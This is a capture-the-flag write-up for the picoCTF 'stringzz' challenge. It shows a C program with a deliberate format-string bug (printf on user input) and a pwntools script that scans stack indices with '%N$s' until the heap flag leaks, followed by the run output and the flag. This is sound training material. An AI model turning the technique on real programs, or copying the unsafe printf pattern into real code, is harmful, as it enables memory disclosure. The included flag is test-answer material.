# stringzz
Binary Exploitation, 300 points

## Description:
> Use a format string to pwn this program and get a flag.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAG_BUFFER 128
#define LINE_BUFFER_SIZE 2000

void printMessage3(char *in)
{
  puts("will be printed:\n");
  printf(in);
}
void printMessage2(char *in)
{
  puts("your input ");
  printMessage3(in);
}

void printMessage1(char *in)
{
  puts("Now ");
  printMessage2(in);
}

int main (int argc, char **argv)
{
    puts("input whatever string you want; then it will be printed back:\n");
    int read;
    unsigned int len;
    char *input = NULL;
    getline(&input, &len, stdin);
    //There is no win function, but the flag is wandering in the memory!
    char * buf = malloc(sizeof(char)*FLAG_BUFFER);
    FILE *f = fopen("flag.txt","r");
    fgets(buf,FLAG_BUFFER,f);
    printMessage1(input);
    fflush(stdout);
 
}
```

## Solution: 

The flag is somewhere in the heap, but there's a pointer to it on the stack. So, if we locate it and send it to `printf` as a string (`%s`), we'll get the flag. We just have to go far enough down the stack.

We'll use the "format string direct access" syntax to access the n'th variable on the stack and cast it to a string pointer.

The syntax starts with `%`, then an index, then `$` and then the format specifier. So, `%17$x` would jump to the seventeenth member of the stack and print the value in hex format.

We'll scan the stack using:
```
%0$s
%1$s
...
```

Sometimes, the value on the stack can't be dereferenced as a string (the easiest example is the value of 0x0, which is also NULL). However, we don't mind, that isn't our flag pointer and even if the program crashes, we'll move on to our next attempt.

The script:

```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/stringzz_2_a90e0d8339487632cecbad2e459c71c4/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

import os

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

index = 0
while True:
    log.info("Trying index {}".format(index))
    with context.local(log_level='ERROR'): 
        io = start()
        io.sendlineafter("input whatever string you want; then it will be printed back:\n", "%{}$s".format(index))
        res = io.recvall()
    if "picoCTF" in res:
        log.success(res)
        break
    index += 1
```

Output:

```console
root@kali:/media/sf_CTFs/pico/stringzz# python exploit.py
[*] '/media/sf_CTFs/pico/stringzz/vuln'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.hGOzj1x5Fr'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/stringzz_2_a90e0d8339487632cecbad2e459c71c4'
[*] Trying index 0
[*] Trying index 1
[*] Trying index 2
[*] Trying index 3
[*] Trying index 4
[*] Trying index 5
[*] Trying index 6
[*] Trying index 7
[*] Trying index 8
[*] Trying index 9
[*] Trying index 10
[*] Trying index 11
[*] Trying index 12
[*] Trying index 13
[*] Trying index 14
[*] Trying index 15
[*] Trying index 16
[*] Trying index 17
[*] Trying index 18
[*] Trying index 19
[*] Trying index 20
[*] Trying index 21
[*] Trying index 22
[*] Trying index 23
[*] Trying index 24
[*] Trying index 25
[*] Trying index 26
[*] Trying index 27
[*] Trying index 28
[*] Trying index 29
[*] Trying index 30
[*] Trying index 31
[*] Trying index 32
[*] Trying index 33
[*] Trying index 34
[*] Trying index 35
[*] Trying index 36
[*] Trying index 37
[+]
    Now
    your input
    will be printed:

    picoCTF{str1nG_CH3353_166b95b4}
```
